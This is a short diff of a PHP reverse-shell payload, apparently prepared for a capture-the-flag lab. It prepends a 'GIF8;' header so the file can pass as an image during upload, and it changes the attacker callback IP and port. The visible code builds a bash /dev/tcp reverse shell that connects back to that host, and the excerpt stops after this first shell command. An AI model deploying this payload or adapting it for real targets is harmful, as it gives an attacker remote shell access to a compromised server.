@@ -1,8 +1,9 @@
+GIF8;
 <?php
 
 # User config
-$ip = '10.10.14.207';
-$port = '9999';
+$ip = '10.10.14.5';
+$port = '9002';
 
 $rev_shells = array(
 	'/bin/bash -i > /dev/tcp/'.$ip.'/'.$port.' 0<&1 2>&1',
